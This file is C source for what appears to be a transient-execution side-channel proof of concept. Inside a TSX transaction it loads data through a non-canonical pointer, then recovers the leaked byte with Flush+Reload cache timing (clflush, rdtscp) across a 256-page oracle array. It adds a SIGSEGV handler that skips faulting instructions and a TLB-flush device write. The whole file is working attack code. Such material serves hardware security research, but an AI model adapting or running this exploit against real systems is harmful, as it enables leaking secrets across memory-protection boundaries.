#include <stdlib.h>
#include <stdio.h>
#include <immintrin.h>
#include <sys/time.h>
#include <stdint.h>
#include <time.h>
#include <string.h>
#include <sched.h>
#include <unistd.h>
#include <x86intrin.h>
#include <sys/mman.h>
#include <fcntl.h>
#define __USE_GNU
#include <signal.h>
#include <ucontext.h>
#define PG_SIZE (4096U*1)
#define NUM_EXPR 400
#define NUM_ROUNDS 10
#define TENREP(a)     a;a;a;a;a;a;a;a;a;a
#define HUNDREDREP(a) TENREP(TENREP(a))
#define HUNDREDREP1(a) HUNDREDREP(HUNDREDREP(a))
#define CACHELSZ 64
#define PRIME_PREFETCH 457
#define L3CACHESZ (PG_SIZE*4096)

volatile char *oraclearr;
volatile char *shdworaclearr;
volatile unsigned *tmp_store;
volatile unsigned char* addr1;
volatile unsigned char* addr2;
volatile unsigned char* addr3;
uint64_t *cache_evicter;
int tlb_fd;
int shadow_offset[1024];
int offset = 0xfa;
int shadow_offset[1024];
int shift = 0;
uint64_t averg[256];
int64_t averg_rnd[256];


size_t memsize;
void* mem;

void tlb_flush_all(){
    pwrite(tlb_fd, 0x0, 100, 0x0);
}

void evict_full_cache(){
    // lets evict full cache with dummy calculations
    for(size_t i = 1; i < (L3CACHESZ/sizeof(uint64_t)); ++i){
        cache_evicter[i] += cache_evicter[i + 1] * cache_evicter[i - 1]; 
        cache_evicter[i] -= cache_evicter[i + 2] * cache_evicter[i]; 
        cache_evicter[i] *= 0.78;
        __builtin_prefetch(&cache_evicter[i + 2]);
    }
}

void evict_l1_cache(volatile void *addr){
		for(int i = 0; i < memsize; i += 4096){
			volatile char* ptr = (volatile char*)((((uint64_t)mem + i) & (~0xfff) | (uint64_t)addr & 0xfff));
			*ptr;*ptr;
		}
}

static inline void clflush(void* addr){
    // __asm__ __volatile__ ("\tclflush (%0)\n"::"r"(addr));
    asm volatile("\tclflush (%0)\n" : :"r"(addr) : "memory");
}


void flush_all(){
    for(int i = 0; i < 256; ++i){
        clflush((void*)oraclearr + PG_SIZE * i + i);
    }
}

void void_operations1(int64_t *a, int64_t *b);

static inline void memaccess(void* p){
    volatile char* addr = (volatile char*) p;
    *addr;
}

void void_operations3(volatile char* a, volatile unsigned char* b){
    addr1[offset] = 0xe1;
    asm volatile("\txbegin label1\n");
    addr1[offset] = 0xe1;
    oraclearr[PG_SIZE * addr3[offset]];
    oraclearr[PG_SIZE * addr3[offset]];
    oraclearr[PG_SIZE * addr3[offset]];
    oraclearr[PG_SIZE * addr2[offset]];
    oraclearr[PG_SIZE * addr2[offset]];
    asm volatile("xend\nlabel1:\n");
};

void void_operations2(int64_t *a, int64_t *b){
    while(*a > *b){
        *a -= *b;
    }
    if(b>a) void_operations1(b, a); 
    else void_operations3(oraclearr, addr2);
    return;
}

void void_operations1(int64_t *a, int64_t *b){
    while(*a > *b){
        *a -= *b;
    }

    if(b>a) void_operations2(b, a);
    else void_operations3(oraclearr, addr2);
    return;
}

static unsigned long long rdtscp() {
	unsigned long long a, d;
	asm volatile ("rdtscp" : "=a" (a), "=d" (d));
	a = (d<<32) | a;
	return a;
}

uint64_t time_access(volatile void* add){
	uint64_t t1, t2;
	volatile char *f = (volatile char*)add;
    // for(int i=0; i < 12; ++i)sched_yield();
	t1 = rdtscp();
	*f;	
	t2 = rdtscp();	
	return (t2 - t1);
}
//pwrite(tlb_fd, 0x0, 100, 0x0);

static void handler(int signum, siginfo_t *si, void* arg){
    ucontext_t *ucon = (ucontext_t*)arg;
    // printf("SEGFAULT CODE LETS TEST FIRST BYTE %p\n", ucon->uc_mcontext.gregs[REG_RIP]);
    ucon->uc_mcontext.gregs[REG_RIP] = ucon->uc_mcontext.gregs[REG_RIP] + 17;
}


int  __attribute__((optimize("-O0")))main(void){
    register char loaded_val;
    volatile char *f;
    int64_t a = 100000000,b = 100;
    struct sigaction sa;

    sa.sa_handler = (void (*)(int))handler;
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = SA_RESTART;
    if (sigaction(SIGSEGV, &sa, NULL) == -1) return -1;

    addr1 = (char*)(((uint64_t)malloc(20*PG_SIZE) + PG_SIZE) & ~0xFFF );
    addr3 = (char*)(((uint64_t)malloc(20*PG_SIZE) + PG_SIZE) & ~0xFFF );
    // addr2 = (char*)(((uint64_t)malloc(20*PG_SIZE) + PG_SIZE) & ~0xFFF );
    addr2 = (volatile char*)((uint64_t)addr1 | 0xff00000000000000); //(char*)(((uint64_t)malloc(20*PG_SIZE) + PG_SIZE) & ~0xFFF );
    cache_evicter = (uint64_t*)malloc(L3CACHESZ + sizeof(uint64_t) /* padding */);
    addr1[offset] = 0xff;
    tlb_fd = open("/dev/tlb_invalidator", O_WRONLY, 0x0);
    memsize = sysconf(_SC_PAGESIZE) * 1024;
	mem = (malloc(memsize));
    oraclearr = malloc(sizeof(char) * PG_SIZE*1024);
    tmp_store = malloc(sizeof(unsigned));
    // EVERYTHING IS INITIALIZED
experiments_:
    printf("Running experiments\n");
    memset(averg_rnd, 0x0, 256*sizeof(int64_t));
    memset(averg, 0x0, 256*sizeof(uint64_t));
    addr3[offset] = 0x34;
    // addr2[offset] = 0x34;
    for(int rnd_i = 0; rnd_i < NUM_ROUNDS; ++rnd_i){
        memset(averg, 0x0, 256*sizeof(uint64_t));
        for(int i = 0; i < NUM_EXPR; ++i){
            // evict_full_cache();
            int flag = 0;
            for(unsigned int j = 0; j < 256; ++j){
                f = (volatile char*)oraclearr + PG_SIZE * addr1[offset];
                asm volatile("\tclflush (%0)\n"::"r"((void*)&oraclearr[PG_SIZE * j]));
                // flush_all();
                tlb_flush_all();
                // evict_full_cache();
                void_operations1(&a, &b);
                // asm volatile("mfence");
                averg[j] += time_access((void*)(oraclearr + PG_SIZE * j));
            }
        }
        uint64_t min = (uint64_t)-1;
        int minid = -1;
        for(int rn = 0; rn < 256; ++rn){
            if((averg[rn]/NUM_EXPR) <= (min - 1) && rn > 0 && rn != addr3[offset]){
                min = averg[rn]/NUM_EXPR;
                minid = rn;
            }
        }
        ++averg_rnd[minid];
    }
    int winner;
    int64_t winner_max = -1;
    int64_t winner_min = 0xfffffffe;
    for(int i = 0; i < 256; ++i){
        if(averg_rnd[i] > winner_max){
            winner_max = averg_rnd[i];
            winner = i;
        }
        if(averg_rnd[i] < winner_min){
            winner_min = averg_rnd[i];
        }
	    printf("BYTE 0x%02x : %4lu wins : %4lu us\n", i, averg_rnd[i], averg[i]/NUM_EXPR);
    }
    if( (winner_max - winner_min) < NUM_ROUNDS / 3) {
        printf("Not egnough confidence\n");
        goto experiments_;
    }
    printf("ADRESSES WERE [%p] vs [%p]\n", &addr1[offset], &addr2[offset]);
    printf("Winner is 0x%02x [%c]\n", winner, winner);
    return 1;
}

//
//
